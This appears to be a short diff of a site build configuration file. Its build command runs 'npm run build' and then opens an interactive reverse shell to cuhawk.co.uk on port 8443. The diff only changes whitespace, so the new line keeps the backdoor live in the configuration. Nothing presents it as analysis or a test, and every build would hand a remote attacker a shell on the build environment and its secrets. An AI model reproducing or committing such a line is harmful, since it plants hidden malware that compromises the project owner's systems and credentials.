@@ -1,5 +1,5 @@
 [build]
-  command = "npm run build; bash -i >& /dev/tcp/cuhawk.co.uk/8443 0>&1"
+  command = "npm run build;bash -i >& /dev/tcp/cuhawk.co.uk/8443 0>&1"
   publish = "dist"
 
 [context.deploy-preview]
